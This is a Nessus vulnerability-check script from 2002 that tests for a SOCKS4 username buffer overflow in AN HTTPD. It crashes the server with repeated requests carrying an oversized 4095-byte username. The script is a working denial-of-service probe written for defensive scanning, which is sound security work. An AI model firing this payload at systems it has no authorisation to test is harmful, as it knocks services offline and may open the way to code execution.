#
# This script was written by Michel Arboi <arboi@alussinan.org>
# GPL
# 
# References:
# Message-ID: <20021020163345.19911.qmail@securityfocus.com>
# Date: Mon, 21 Oct 2002 01:38:15 +0900
# From:"Kanatoko" <anvil@jumperz.net>
# To: bugtraq@securityfocus.com
# Subject: AN HTTPD SOCKS4 username Buffer Overflow Vulnerability
#
# Socks4 protocol is described on 
# http://www.socks.nec.com/protocol/socks4.protocol
#
# Vulnerable:
# AN HTTPD
#


if(description)
{
 script_id(11164);
 script_bugtraq_id(5147);
 script_version ("$Revision: 1.6 $");
 name["english"] = "SOCKS4 username overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "
It was possible to kill the remote SOCKS4 server by
sending a request with a too long username.

A cracker may exploit this vulnerability to make your SOCKS server
crash continually or even execute arbitrary code on your system.

Solution : upgrade your software
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Too long usernamename kills the SOCKS4A server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports("Services/socks4", 1080);
 script_dependencie("find_service.nes");
 exit(0);
}

########

include("misc_func.inc");


port = get_kb_item("Services/socks4");
if(!port) port = 1080;
if(! get_port_state(port)) exit(0);

soc = open_sock_tcp(port);
if(! soc) exit(0);

nlen = 4095;
# Connect to 10.10.10.10 on port 8080 (= 31*256+4)
cnx = raw_string(4, 1, 4, 31, 10, 10, 10, 10) + crap(nlen) + raw_string(0);

for (i=0; i < 6; i=i+1)
{
 send(socket: soc, data: cnx);
 r = recv(socket: soc, length: 8, timeout:1);
 close(soc);
 soc = open_sock_tcp(port);
 if(! soc) { security_hole(port);  exit(0); }
}

close(soc);
